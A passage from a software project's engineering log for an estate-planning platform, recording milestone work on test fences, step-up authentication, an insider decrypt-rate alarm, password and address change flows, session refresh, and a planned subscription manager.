the wire and deliberately do not survive" its schema, false since PR1 narrowed
the list DTO; the schema stays as DEFENCE IN DEPTH and the sentence says so.

**THE ROUTE↔CONSUMER FENCE PR1 SHIPPED HAD FOUR HOLES, WHICH IS THE REPO'S OWN
EXPECTATION OF NEW TRUST MACHINERY.** Its verb list omitted `Search`, `Head`,
`Options` and `All`, so a route declared with any of them was INVISIBLE to a
fence whose whole job is to see every route; a decorator the parser could not
read was silently skipped rather than reported (now collected into
`unparseable` and asserted empty); a consumer template's `:p` matched a
LITERAL route segment, so a client addressing the wrong path could satisfy the
wrong route; and the vault edge's rewrites were a HAND-COPIED table, the drift
class this repo keeps closing — they are DERIVED from
`apps/vault-web/src/server.ts` now, with the derivation asserting the `/api/`
prefix is absent and that no pair reaches `/v1/auth/handoff`. The four
`/v1/analysis/*` routes needed a DECLARED exception (`consumedByName`) rather
than a looser matcher: the BFF genuinely addresses all four through a closed
`AnalysisName` union, and loosening the rule globally to admit that one shape
would have re-opened the hole the tightening closed.

**THE UI HALF, all found by reading and then proven in a browser.** The retire
ceremony had NO step-up path — with the new gate it would have failed with a
generic refusal, so `submitRetire` reports `applied | stale` and routes
`STEPUP_REQUIRED` through the ONE `StepUpPrompt`, which REPLACES the retire
form while it is up (the M15 identical-label rule: two forms with a "Confirm"
button are two a person cannot tell apart). The edit form stayed open on an
asset that had just been retired — offering what the server would refuse, the
M12 rule. A designation left a STALE history list on screen beside a fresh
version, because history was cleared only by the panel's own commands and PR3's
ceremony bumps the version through a CHILD; `onVersionBumped` clears it, and
the pin drives the real child flow rather than a test-only handle (production
must not grow one). `ReadinessPanel` dereferenced two GraphQL payloads with no
shape guard — the M11 rule, and its third instance in three milestones. And
`ownershipPct` rendered raw, so binary floating point printed
`33.33000000000001` at someone about their house.

**ONE FINDING WAS OLDER THAN M19 AND IS FIXED ANYWAY**, because M19 is what
made it reachable. Identity's step-up cap (M17 PR6) answers 429
`too_many_attempts`, and the BFF's shared `mapError` had no 429 branch — so a
control firing exactly as designed fell through to
`Error('identity responded with status 429')` and reached the browser as
"something went wrong on our side". That is the M9 rule inverted, and the same
shape the 404 branch beside it already names. M19 PR3 and PR4 put step-up
ceremonies on the assets surface, so the cap is now reachable from two more
places. PROVEN BY EXECUTION: five wrong codes at `POST /v1/auth/stepup` answer
401 `invalid_code`, the sixth answers 429. `TOO_MANY_ATTEMPTS` is its own code
because it is the ONLY refusal in the union whose remedy is to WAIT — every
other one is fixed by doing something differently now — so folding it into
`INVALID_CREDENTIALS` would render "codes change every 30 seconds, enter the
current one" at someone whose current code will also be refused. The web
copy says to wait and says nothing is wrong with the code, pinned by a test
asserting exactly that; the derived `error-codes.test.ts` fence caught the
drift by itself, which is the fence working.

**Every fix was mutation-tested** by reverting it from a saved copy and
confirming RED on the assertion that names the property — including the four
fence fixes, re-run with the REVIEW'S OWN payloads. Two mutations SURVIVED and
both were the harness lying rather than the tests being weak: one anchored on a
`return dtos;` that occurs several times (`indexOf` finds the first), and one
found no test provoking the share-sum trigger at all, which is what produced
the unit pin above.

**Remaining:** none. M19 is complete.

### Interlude — permission grants confer only what something reads (2026-08-14)

Not a milestone: one defect found while scoping the next one, fixed on its own
branch before that milestone started, because a live defect must not hide inside
a feature change.

**The finding.** `permission_grants` accepted any lowercase token as a `resource`
and any of three actions, stored the row, audited `permission.granted` and listed
it back to the owner under "What this role may read". Exactly one pair is read by
anything — `effectiveContactReadGrants`, profile's only grant reader, filters
`pg.resource = 'contact' AND pg.action = 'read'`. MEASURED against real Postgres
over the six combinations the people surface offered: one conferred access, five
conferred nothing, and two of those five were buttons ("Allow: Your assets",
"Allow: Your documents"). The security shape is in docs/03 §6s; what belongs here
is that **the defect was a drift between two internally-consistent lists, and
neither side's tests could see it.** The surface's `RESOURCES` had three entries
and the reader had one, both had been that way since M13, and every suite was
green. That is the zero-callers shape inverted: not a route with no consumer, but
a consumer with no enforcement.

**What it ships.**
- `apps/services/profile/src/enforced-grants.ts` — the enforced pairs as data,
  with a reason per entry; `addPermission` refuses everything else with `422
  grant_not_enforced`, AFTER the ownership check so it cannot become an oracle.
  The check is on the PAIR and lives in the service rather than in the zod
  schema: `contact` and `read` are each enforced and `contact`+`download` is not,
  which a per-field enum cannot express.
- `test/enforced-grants.spec.ts` — the declared table asserted equal to the
  literals the reader's SQL really filters on, plus "no undeclared file reads
  grants" derived from the directory. It REFUSES a SQL shape it cannot parse
  rather than matching nothing, since a second enforced pair needs an `IN` and a
  fence that stops matching goes green.
- `apps/web/src/components/RoleControls.enforced.test.ts` — what the surface
  offers asserted equal to what profile enforces, by reading the other file (the
  compose-parity mechanism; the web app cannot import a Nest package). Both
  scans carry anti-vacuity floors, because two regexes that quietly match
  nothing agree perfectly.
- The surface offers only `contact`, and SAYS which parts of an estate are not
  shareable — silence would leave the same wrong belief more quietly. Grants
  written before the vocabulary closed still render with their label and stay
  withdrawable.
- `GRANT_NOT_ENFORCED` through the BFF and into the app's copy, kept apart from
  the generic `INVALID_REQUEST` a 422 maps to everywhere else on that client.

**Nine mutations, all red, all restored** — including the two that matter most:
deleting the refusal (red at the service AND over real HTTP against real
Postgres) and putting `grantable: true` back on assets (red at the web fence).
The int suite's own fixtures had to change: **two existing cases used
`document`/`read` and `asset`/`read` as convenient grants**, which is how a
promise with no enforcement behind it survives a test run.

**Left open, deliberately** (docs/03 §6s): there is no mechanism at all by which
an owner can share an asset or a document with a role-holder. Building one is a
cross-cluster authorization change and belongs to a milestone that can take that
decision; the fence forces a new enforced pair to arrive in the same change as
the code that reads it.

### Interlude — the insider alarm fired on an owner reading their own estate (2026-08-14)

The second of the two defects found while scoping M20, fixed on its own branch
for the same reason as the first.

**The finding, measured before it was argued.** Seven ordinary `/assets` page
loads of a 120-asset estate raised M18's TB4 insider alarm:
`crypto.decrypt_rate.exceeded`, `boundName=asset_user count=1680 bound=1500`. The
count was correct — the page issues Assets and NetWorth together, so a page load
costs **2 decrypts per asset owned** — and `asset` is the one bound in the table
whose legitimate volume scales with ESTATE SIZE rather than with activity, while
the 1500 was calibrated on the M19 PR2 journey, an estate of a handful of assets.
A bigger number does not fix an unbounded quantity: it false-positives on some
larger estate and blinds the detector for every smaller one. And a security
alarm that fires on the product's own happy path is the M5 permanently-red-gate
lesson arriving at the one control docs/03 §4 calls the most important insider
control there is.

**The fix is a second dimension, ANDed.** A bound may now also carry
`maxDistinctSubjectsPerWindow`, and a breach requires both thresholds strictly
exceeded. The subject is the row id already inside the field name, located by a
position declared per prefix in `DECRYPT_FIELD_SUBJECTS` (@estate/contracts) and
counted by the sweep's own `count(DISTINCT CASE … split_part …)`. Exactly one
bound carries it today.

**Why that is not a hole.** distinct ≤ count always, and the table invariant
keeps the distinct threshold at or below the count threshold, so anything that
clears the count bound on DISTINCT rows clears both: a mass read of N different
assets breaches at exactly the N it did before. **The detection threshold is
unchanged; only the amplification from re-reading is removed** — and re-reading
a row you already read moves no plaintext you had not already seen.

**The declaration is deliberately sparse, and `doc` is the recorded trap.** A
declaration can only ever SUPPRESS, so a wrong one is a blind spot rather than
noise. `doc.<ownerUserId>.v<n>.<sha>` puts the OWNER at the tempting segment 2 —
sampling the live stream shows a UUID there and invites exactly the declaration
that would collapse a whole document library to one subject.
`packages/contracts/test/decrypt-field-subjects.spec.ts` therefore pins every
declared position to its constructor in the owning service's SOURCE, and asserts
both halves of the `doc` case. That fence found its own defect on its first run:
it read a backtick span inside a `//` comment (`asset.estate.viewed`, an audit
action) as a template literal — the repo's `code()` rule, restated for a scanner
that must keep template bodies intact.

**Proven at three layers.** Unit (the evaluator's two-axis boundary, the table
invariants, the merge's deliberate over-count); integration against real
Postgres running the EXPORTED query rather than a copy, including the 1501-row
suppression and its positive control; and live, where one table carries the whole
result — a pre-fix run (1680 decrypts / 120 distinct) raised an anomaly with no
distinct fields, two post-fix runs with byte-identical economics raised none, and
in the same window a 1501-asset estate read once (3002 / 1501) breached with
`distinctSubjects: 1501, distinctBound: 1500`, so the detector's silence is a
decision rather than a dead tick. Eight mutations red.

**Left open** (docs/03 §6q(ii)): an estate above 1500 distinct assets still trips
on a single page load — the threshold doing its job where the two readings
converge, and the honest cost of a constant, since the detector runs in the audit
cluster and cannot ask how large an estate legitimately is without a
cross-cluster read its zero-credential posture forbids.

**Observed while driving it, out of scope and recorded:** a sustained
asset-create loop twice killed the assets service with a V8 `Deoptimizer` fatal
("unreachable code", node 22.22 on arm64), leaving the container `running=true`
with `restarts=0` and the port answering nothing — the M8 "up with a dead
service" shape, from a runtime crash rather than from our code. It reproduced
under load and not otherwise; nothing here depends on it.

### Interlude — a mail the carrier refused was recorded as delivered (2026-08-14)

**Found while scoping the account surface, fixed on its own branch first**, on
the standing rule that a live defect must not hide inside a feature change.

`SendOutcome` is a discriminated union: `accepted` says a healthy notifications
service replied, `delivered` says the mail went. Three identity call sites — the
mailed reset code, the reset-completed notice and the password-change notice —
read the DISCRIMINANT alone, and each of those booleans renders as the literal
string `delivered` or `failed` in an append-only audit event. So a notice nobody
received was recorded as delivered, on the account-recovery ceremony whose whole
failure mode is a user who cannot get in. Reachable rather than theoretical:
M9's recipient feed is fire-and-forget, so a registration during a notifications
outage leaves no recipient row — and that user is precisely the one who later
cannot sign in. Full record in docs/03 §6t.

Two things made it invisible, and both generalize. TypeScript forces a narrowing
on the discriminant before `delivered` may be read, so **stopping at the
narrowing guard type-checks perfectly** while meaning something else. And NO
DOUBLE IN IDENTITY'S TEST DIRECTORY EVER ANSWERED ON THE DISAGREEING ARM: of 38
specs, 13 name `accepted` and 12 produce an outcome, and every one of the twelve
was `delivered: true`. Measured, because the first write-up of this said
"every one answered a bare `{ accepted: true }`" and that is false — four did,
while **three produced fully valid four-field outcomes and were exactly as
blind**. The mechanism was never a malformed literal; it was an unexercised arm,
and the casts (`as never`, `as unknown as NotificationsPort`) meant the compiler
could not have said so either.

Fixed as ONE spelling (`wasDelivered`, the single derivation for every consumer,
used at all seven identity sites) plus a fence that forbids a consumer naming
the discriminant unless it is one of three declared notifications adapters,
which must narrow to translate the wire outcome into their own port — and a
second that forbids hand-rolled outcome literals in the test directory. Four
mutations red, and the two new integration cases each go red on their own defect
against real Postgres.

**Two claims corrected rather than left standing.** docs/03 §6l's residual said
an undelivered notice "leaves `notified: failed` … for an operator to re-drive";
for the password change that was false, and it is now true. And the reset's own
comment credited its retire-on-failure with preventing a "TTL-long lockout" —
`lastMintedAt` orders over revoked rows too, so retirement cannot shorten the
re-issue floor; the code is retired because a live reset code that reached no
mailbox should not exist.

### M20 — The account surface (in progress, 2026-08-15)

**M17 built six ceremonies and no way to reach any of them.** Password change,
password reset (request + complete) and email change (request + complete +
cancel) all ship service-side with their copy and control decisions taken — and
no product code calls any of them. The route↔consumer fence found that on its
first run and recorded it as `EXEMPT_RECOVERY_SURFACE`; M20 is the milestone
that flips those six exemptions to consumers, one PR at a time, each in the same
change as its own client (the M9 PR2 rule).

**Where it lives: `/security`, not a new page.** The plan said "/account", and
discovery falsified the premise — `/security` already owns every sign-in
control (M14's address verification, M17's passkeys, M16's paired devices), and
it already carries the invariant that matters here: ONE step-up prompt on the
page at a time, held in a single `StepUpTarget` union after the M15 PR3
identical-label defect. A second page would have meant a second prompt, a second
copy of that invariant, and "how you sign in" split across two destinations.

**PR0 — a discriminant read as an answer (merged, `c2a378a`).** Found while
scoping: three identity sites recorded an undelivered mail as `delivered` in the
append-only trail. Fixed as one spelling (`wasDelivered`) plus a fence. Full
record in docs/03 §6t.

**PR1 — the password change (merged, `3537f75`).** The first product consumer of
any of the six. BFF client + GraphQL mutation + a Password section on
`/security`. Decisions worth keeping:

- *Step-up is CONDITIONAL and the UI is built for both paths.* Identity gates on
  `SecondFactorGate`, which refuses only when the account already holds a
  verified TOTP or passkey — an account with no factor is let through
  deliberately, or its password would be unchangeable forever, which is the
  worst answer for exactly the users with the least protection. So
  `STEPUP_REQUIRED` is a possible answer, never a guaranteed first one.
- *`INVALID_CREDENTIALS` gets a THIRD meaning* (`passwordChangeMessageFor`). The
  shared copy says "that email and password combination didn't work" and this
  form has no email on it — the M12 defect, one surface over, caught before it
  shipped rather than after. The caller is already authenticated here, so the
  refusal cannot be an account-existence oracle and can safely name the field.
- *The prompt REPLACES the form.* That, not the carried attempt, is what stops a
  step-up retry from picking up a value the user never confirmed — established
  by mutation, after the carry was written up as the control and proved not to
  be. The carry stays as belt, with the reason recorded, because it becomes
  load-bearing the moment somebody makes the form merely disabled.
- *A confirm field, which the server has no concept of.* A typo in the new
  password is not recoverable today: the change succeeds with a value nobody
  knows, and the reset surface that would undo it is PR3.
- *The password minimum is now PINNED across the boundary.* `12` was declared
  four times — once in the web app, three times in identity — with nothing
  comparing them. `password-policy.test.ts` reads identity's source as text (the
  compose-parity mechanism) and asserts every password-ish minimum is either a
  presence check or exactly `PASSWORD_MIN_LENGTH`, so a raise fails as loudly as
  a drop.

**The fence gained two checks while being flipped**, both from holes found
wiring PR1: the `enumerated` reason (the other kind of declared reason) was
checked by nothing though its mere presence widens the consumer matcher; and
NOTHING DETECTED A STALE EXEMPTION — shipping a client while leaving
`{ exempt: … }` in place left the fence green, still asserting "no product
consumer" about a route the product had started calling. That second one is what
makes flipping PR2's and PR3's entries mandatory rather than remembered.

**Driving PR1 in a real browser found a defect eighteen milestones old**, and it
sat on the page this PR extends: the web app declared the `MfaLevel` GraphQL
enum in lowercase while the wire carries the member NAME, so every
`session.mfaLevel === 'none'` was permanently false and every account — factor
or not — was shown "MFA enrolled" and offered "Re-enroll authenticator app".
Measured before and after against the same account and session. It is not an
authorization defect (the gate reads the database, not the browser) but it is a
misstatement about a control in the direction that stops someone acting, and it
sat directly above a password change whose step-up gate is conditional on that
very factor. Fixed at three layers — the union, a behavioural pin on the
factorless branch for both surfaces (`SessionCard` had no test file at all), and
`graphql/enum-parity.test.ts`, which derives every enum mirror from the BFF's
SDL. The two verification enums were inline unions checked by nothing and were
promoted to exported types in the same change, so the fence is a uniform rule
with no escape hatch. Full record in docs/03 §6u.

**Also measured while driving, and it is PR4's evidence:** a signed-in browser
reports "Your session has ended" after fifteen minutes, while its session row is
live and its refresh token good for thirty days. The app has no refresh wiring,
so the access-token TTL is the whole usable session — confirmed by reading
`revoked_at IS NULL` alongside an elapsed `access_expires_at`, which is what
distinguishes expired from revoked. The UI renders those two states identically
today, which is its own item for PR4. **CLOSED by PR4** — see its section
below and docs/03 §6x.

**PR2 — the address change (merged, `e1b3d69`).** All three legs, on the same
page, which leaves only the two reset legs exempt. The load-bearing decisions:

- *No layer may render the 202 as a delivery receipt.* Identity answers before
  it knows whether it will send anything — the availability lookup, the encrypt,
  the stage and the mail all run detached, so an address that already belongs to
  somebody else is answered identically and never mailed. The client returns
  `void` (no field to mistake for confirmation), the success copy is
  CONDITIONAL, and the refusal for the re-issue bounds is named
  `CODE_REQUESTED_RECENTLY` rather than `CODE_ALREADY_SENT`: the per-destination
  bound can fire against an address that was never mailed, so a name asserting a
  send would put "use the one we sent you" in front of somebody with an empty
  inbox.
- *Two route-specific error mappers, because the shared one is wrong here.*
  `mapError` keys 400 on the STATUS; identity answers 400 for a rejected account
  password, for both bounds, and for every refused code. Without the mappers a
  wrong password and a rate refusal both arrive as "review your request", and
  the completion leg's uniform refusal flattens into the same. The `mapVerifyError`
  precedent, applied twice.
- *The completion form is always available*, and that follows from a gap: no
  route reads pending state, so the page cannot know on load whether a change is
  outstanding. Gating the field on a request made in THIS tab would strand
  anyone who closed the page or reads mail on another device.
- *The M15 label rule bit immediately, and the existing tests are what caught
  it.* A second "Current password" field on the page made
  `getByLabelText` ambiguous and turned twelve password-change assertions red.
  Fixed by naming what the field IS ("Account password") rather than which one —
  "current" earns its place two sections up by contrasting with "New password",
  and there is nothing here to contrast with.
- *One page, two panels, one fact.* Completing a change also VOUCHES for the new
  address, so the sibling verification panel would keep saying "hasn't been
  confirmed yet" above the sentence saying it has. `AccountSecurity` re-mounts
  it, so the authority stays the server rather than a boolean passed between
  siblings; the remaining staleness is the app-shell banner, recorded as a
  residual rather than papered over.

Eleven mutations, ten red on the assertions that name the property. The
eleventh — the step-up retry reading live inputs instead of the carried attempt
— SURVIVED, exactly as PR1's did and for the same reason: the prompt replaces
the form, so the values cannot move. Recorded rather than papered over by
weakening the mutation. Full record in docs/03 §6v.

**PR3 — the password reset (merged, `96d1ec9`).** The last two exempt routes gain their
consumer, and the surface is the first in the product a signed-OUT caller
drives — hence the `(auth)` route group (`/reset`, linked from the login page)
rather than `/security`, which every other M20 slice extends. The decisions:

- *The 202-is-not-a-receipt rule arrives on an anonymous surface.* The request
  answers `{ok:true}` byte-identically for an unknown address, the 30-minute
  floor and a real send (proven on the wire), so the success copy is
  conditional on all of it and the client returns `void`. Unlike PR2, the
  request leg KEEPS the shared error mapper, and the reason is the inverse of
  PR2's: the only 400 this route can answer is a malformed body — everything
  interesting is deliberately inside the 202 — so a route-specific mapper
  would be a second copy with nothing to distinguish.
- *One mapper for both mailed-code redemptions.* `mapChangeCompleteError`
  became `mapCodeRedemptionError` at its second caller (one behaviour, one
  spelling — the M8 PR2 rule), so neither surface's refused code can reach the
  login vocabulary. Third surface, third remedy for one refused code: "ask for
  a new one above", because here the request form is on the same page.
- *A reset signs you in nowhere, at every layer.* Identity mints nothing
  (§6m's fence); the resolver touches no cookies in either direction — nothing
  was returned to set, and a previously-signed-in browser's stale pair names a
  session the completion just revoked, so there is nothing live to clear. The
  success state REPLACES both forms, states both consequences (signed out
  everywhere including this device; signed in nowhere), and offers exactly the
  next step. The completing browser was measured landing on the signed-out
  shell.
- *The completion form is always available* — PR2's rule, harder: the mail
  carries no link (M9), so a fresh browser is the DESIGNED arrival and the
  page says so.
- *`EXEMPT_RECOVERY_SURFACE` is deleted, not emptied.* A named empty exemption
  invites reuse without re-argument, and PR1's stale-exemption check would
  have refused the entries anyway. All six M17 recovery routes are consumed.

Ten mutations, ten red. Driven live end to end — the wrong code's
`reset_failed | system | {}` (no actor, empty detail), the real code retyped
lowercase with dashes dropped, `reset_completed {"notified":"delivered",
"revokedSessions":"1"}`, old password 401 / new password 200, and the delivery
log's `identity.password_reset` + `identity.password_changed` both
`sent_unverified` (§6t's `wasDelivered` recording the carrier's real answer for
an unproved address). Full record in docs/03 §6w.

**PR4 — session continuity (this PR).** The `Refresh` operation had existed at
every layer since M8 with no caller — the uncalled-operation twin of the
milestone's route gaps — so the access token's 15-minute TTL was the whole
usable session and "Your session has ended" was false every time it rendered.
The decisions:

- *One reactive refresh at the client's single chokepoint.* `gqlRequest`
  retries once after UNAUTHENTICATED behind one silent Refresh; no timer, no
  per-surface wiring. `Query.session` now distinguishes "nothing to
  authenticate with" (null) from "dead access token with a refresh cookie
  behind it" (UNAUTHENTICATED — the retry trigger), so an anonymous visitor
  still costs no identity call and the session-ended copy is TRUE when it
  finally renders: it now means the refresh itself was refused.
- *Single-flight as correctness, not optimization.* Identity's rotation-reuse
  detection treats a concurrently-presented rotated token as theft and revokes
  the session, so the client removes concurrency by construction — an in-tab
  latch plus a cross-tab Web Lock over the shared cookie jar. Proven live:
  a page racing several queries into an expired token produced exactly ONE
  rotation (`refresh_token_prev_h` still held the pre-drive hash).
- *Cookies clear in one failure direction only.* Identity refusing the
  credential as dead clears the pair (dead server-side; clearing is tidying —
  and without it every load repeats the refusal dance); an identity outage
  clears nothing (an outage must not wear the face of a revocation, M16 PR2a).
- *Only queries retry, found by reviewing the PR's own claim.* The comment
  first shipped asserting that a retry can never repeat a side effect — true
  of one hop, false of the eleven BFF resolvers that write and then read back,
  where a refused read-back re-runs a `createContact`/`createFamilyMember`
  that carries no idempotency key and no constraint to catch the duplicate.
  A mutation now reports `SESSION_RENEWED` (renewed, nothing performed, try
  again) rather than the session-ended sentence, and the query/mutation
  discriminator is read off each document rather than kept in a list.
- *The fence:* `operation-consumers.test.ts` — every GraphQL operation has a
  product caller, no exemption mechanism (the PR3 rule), reverse direction
  owned by the compiler. Its first run named exactly one uncalled operation:
  `Refresh`. It also asserts every document is a `query` or a `mutation`, so
  the retry classification above cannot silently acquire a third case.

Fourteen mutations, fourteen red. Driven live: expired access token → uninterrupted
assets page + one rotation in the DB; server-side revocation → the genuine
signed-out rendering, the failed refresh clearing the dead pair, and the next
load answering `session: null` with no identity round trip. Residuals (the
lost-Set-Cookie false-theft signal, the no-Web-Locks cross-tab race, the
one-refused-Refresh cost on signed-out authenticated-only pages) in docs/03
§6x. **PR5** the adversarial security review.

### M21 — Subscription manager (planned; re-sequenced 2026-08-12, displaced again by M20)

**The estate keeps paying until somebody stops it.** Recurring charges — streaming,
SaaS, gym, storage, insurance, domains — continue debiting after death, and every
month between death and cancellation is money out of the estate. An executor
today has to reconstruct that list from bank statements under time pressure.
This milestone makes the list exist BEFORE it is needed, which is the same
argument the whole product rests on.

**Where it lives.** Financial cluster, alongside assets and the Plaid isolate.
It is NOT an asset and must not be modelled as one: `asset_events` is an
event-sourced ledger of things the estate OWNS, and a subscription is a
recurring OUTFLOW. Separate tables, separate bounded context, same cluster and
same Zone B envelope encryption.

**The design decisions to take when this is planned properly.**

- *A subscription list is a behavioural profile, and arguably more sensitive
  than the asset list.* It reveals health conditions (therapy, medication
  delivery), religion, politics, sexuality, and recovery programmes. So the
  merchant name is CIPHERTEXT here, deliberately unlike `assets_view.title`,
  which is accepted plaintext label metadata. The M4/M13 precedent applies:
  decide it explicitly and say why, rather than inheriting the asset service's
  shape because the cluster is shared.
- *Manual entry first; Plaid-assisted detection second.* The M3 decision
  verbatim — the manual ledger shipped before the Plaid isolate, so no dormant
  schema sat under migration drift. Detection is a strong fit (recurring
  merchant, amount and cadence are exactly what transaction data exposes), but
  it must respect the isolate: the asset side cannot unwrap a Plaid token, so
  detection either lives in the Plaid service or arrives as an event carrying
  IDs and enums, never by widening a KMS grant.
- *THE PLATFORM NEVER CANCELS ANYTHING.* It produces a worklist with
  per-merchant instructions and records what the executor did — status, actor,
  date, evidence. Automated cancellation would make the platform an agent acting
  on someone's accounts, which is a fraud vector (cancelling a LIVING owner's
  insurance) and squarely against "settlement is never fully automated".
- *Credentials stay in the vault.* A subscription record may REFERENCE a vault
  item id; it must never hold a password. A second credential store outside Zone
  A is the failure this whole architecture exists to prevent.
- *Not everything should be cancelled, and the naive version of this feature is
  harmful.* Life insurance is an ASSET and cancelling it destroys value. A
  storage unit may hold estate property. A domain registration may carry a
  business. So records need a cancel-guidance classification — cancel / review
  carefully / DO NOT CANCEL — and the executor surface must lead with the last
  category rather than with a "cancel all" affordance.
- *Executor access rides M7 PR2's staged ladder, at the FIRST rung.* Subscriptions
  are inventory-class, and that is a happy alignment: the thing that saves the
  estate money is available at the earliest and least sensitive stage, while
  documents and Zone A stay further along. Beneficiaries get nothing here —
  docs/03 §5.5 scopes them to assets naming them, and a subscription names
  nobody.
- *The abuse case is cancelling a living person's utilities*, so the executor
  view sits behind the same verified-case gate as every other staged grant, and
  every recorded cancellation is audited.

**Natural follow-on:** the M10 readiness analysers gain a deterministic finding —
recurring monthly exposure, and subscriptions with no cancellation route on
file. That is arithmetic over structured data, which is exactly what those
analysers are for.

**RE-SEQUENCED 2026-08-12, and the "No blockers" claim below is corrected.** The
five decisions above are right and survive verbatim — the ciphertext merchant
name and the DO-NOT-CANCEL classification especially, since the latter is the
difference between a useful feature and one that cancels a life-insurance
policy. What was wrong is the readiness claim, which is **true at the service
layer and false at the surface layer**:

- *"Plaid-assisted detection second"* inherits a link flow with ZERO CALLERS.
  `apps/services/plaid/src/plaid.controller.ts` exposes six owner-facing routes
  and `grep -rniE "plaid"` across `apps/bff/src`, `apps/web/src`,
  `apps/vault-web/src` and `apps/vault-extension/src` returns nothing — there is
  no `plaid-client.ts` in the BFF at all. A customer cannot connect an
  institution, so detection has nothing to detect from.
- *"Executor access rides the staged ladder at the first rung"* — the ladder has
  no surface either: no settlement client in the BFF, no settlement route in the
  web app. The rung exists; nothing can stand on it.
- It adds the product's most re-identifying data class to an account that today
  cannot change or reset its password and whose login has no bound. It raises
  the value of a target while leaving its defences where they are.

**So it moves behind M17 (recovery), the assets surface, and settlement**, and
one prerequisite splits out as its own milestone: **the Plaid link surface** —
six routes, a full e2e and a well-guarded isolate, with no written deferral
anywhere (the M3 log defers the SCHEMA, never the UI), gated on obtaining Plaid
sandbox credentials. Doing that inside this milestone would hide a procurement
dependency inside a feature. The numbering of the milestones between here and
there is PROPOSED, not approved; only M17 is settled.

**Two decisions the sketch above does not yet have,** both of which would
otherwise be discovered in this milestone's own review:

- *Who classifies cancel / review-carefully / DO-NOT-CANCEL?* If reference data
  does, it needs the M10 PR3 `review: {reviewedBy, reviewedAt, source,
  effectiveYear}` gate and must refuse in production when unreviewed. If the
  assistant does, the M10 doctrine applies unchanged: THE ANALYSER COMPUTES, THE
  MODEL EXPLAINS — a classification deciding whether an executor cancels a life
  insurance policy must be deterministic code over structured facts, never a
  sampled token.
- *Who dereferences the vault item id, and on whose session?* The financial
  cluster would hold an opaque UUID it cannot verify exists, and resolving it is
  a Zone A read. The answer is almost certainly that the reference is displayed
  as a hint and the executor opens the vault themselves through the M15 origin —
  but it is a cross-zone question and belongs written down, not left to whoever
  builds the surface.

**What keeps this alive rather than dropped:** recurring charges keep debiting
after death, and every month before cancellation is money out of the estate.
That is genuine and unusual user value, and it is why this is a re-sequence.

### Later milestones (rough order, one per bounded context)

**PROPOSED after M17, not yet approved** — recorded so the ordering argument
survives, since the 2026-08-12 selection found that the largest remaining gaps
are SURFACES over shipped backends rather than new domains:

- *The assets surface.* Approved 2026-08-13 as M19 (section above), carrying
  the route↔consumer fence as its PR1. (The sweep's "`CreateAssetInput`
  carries no `inTrust`" was true only of the BFF layer — corrected in the
  M19 section.)
- *The settlement surface.* The largest zero-callers gap by route count (28
  across three controllers, no client in the BFF), and `ContactLinkControls`
  already tells owners a linked contact can report a death — a promise with no
  surface behind it. **It dead-ends without the TB7 operator platform**, which is
  named as owning milestone in five places across docs/03 and docs/04 and
  appears in no milestone list: ship a reporter path alone and a death report
  lands in a queue no human can open. Absorb TB7's minimum or do not start.
- *The Plaid link surface.* Six routes, a guarded isolate, no written deferral
  anywhere. Gated on obtaining sandbox credentials — a procurement dependency,
  which is why it is its own milestone rather than hidden inside M20.
- *The subscription manager (M20).* Re-sequenced above.
- *Referral · search · the M5 cloud half*, reduced by what M8 took over and
  by M18's local decrypt-rate detection.

**The M5 cloud half is blocked on a business decision, not on engineering**
(AWS org, ~$420–1,100/mo dev tier, a CI OIDC role). A meaningful share of
docs/03's open residuals are structurally blocked behind it — the KMS circuit
breaker, the ENFORCEMENT half of TB4's insider control (M18 shipped the
detection half locally: the baseline itself is no longer on this list);
§5.3 canaries; §5.6 Vault-Locked backups; and the audit chain's
S3 Object Lock anchor, an M1 open item now sixteen milestones old. It should
jump the queue the moment billing exists. Two things to know before it does: the
cost of delay is mechanical, since the topology already encoded in
`docker-compose.stack.yml` and `apps/stack/src/generate-env.ts` must be encoded
a second time in Terraform and ten services is cheaper than thirteen; and the M4
publish CLI refuses placeholder-`legalReview` templates under
`NODE_ENV=production`, so a production environment has NO ACTIVE TEMPLATES and
generation returns `template_not_found` until that is resolved.

Settlement came late deliberately: highest-risk domains land on mature
primitives. (Notifications moved up and shipped as M9; the AI assistant is M10.
The vault extension shipped as M16.)
